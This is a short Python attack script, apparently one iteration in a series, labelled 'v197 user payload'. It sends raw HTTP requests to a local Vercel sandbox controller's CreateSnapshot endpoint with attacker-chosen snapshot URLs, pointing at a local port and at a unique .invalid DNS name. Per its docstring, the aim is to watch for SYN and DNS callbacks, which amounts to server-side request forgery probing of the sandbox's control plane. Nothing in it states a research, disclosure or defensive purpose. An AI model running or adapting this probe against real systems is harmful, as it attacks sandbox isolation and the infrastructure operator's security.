# -*- coding: utf-8 -*-
"""v197 user payload: 两个 CreateSnapshot 变体 (SYN 观测 + DNS 观测)"""
import socket, time, json, sys

def log(s, maxlen=3000):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    print('[%.1f] %s' % (time.time(), s), flush=True)

CTRL = 'vercel.sandbox.api.controller.v1.ControllerService'
UUID = sys.argv[1] if len(sys.argv) > 1 else 'v197x'

def post(port, path, body, t=25):
    b = json.dumps(body).encode()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(('127.0.0.1', port))
        hdrs = 'POST %s HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\n' % path
        hdrs += 'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n' % len(b)
        s.sendall(hdrs.encode() + b)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
                if len(d) > 8000:
                    break
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        return st, d[:6000]
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''

log('=== u1: s3://127.0.0.1:18081 ===')
st, pay = post(23456, '/' + CTRL + '/CreateSnapshot',
               {'driveId': 'sandbox', 'bucketBaseUrl': 's3://127.0.0.1:18081/snap/u1'}, t=25)
log('CTRL u1 -> %s %r' % (st, pay[:800]))

log('=== u2: s3://unique.invalid ===')
st, pay = post(23456, '/' + CTRL + '/CreateSnapshot',
               {'driveId': 'sandbox', 'bucketBaseUrl': 's3://%s.dns197.invalid/snap/u2' % UUID}, t=25)
log('CTRL u2 -> %s %r' % (st, pay[:800]))

log('V197U_DONE')
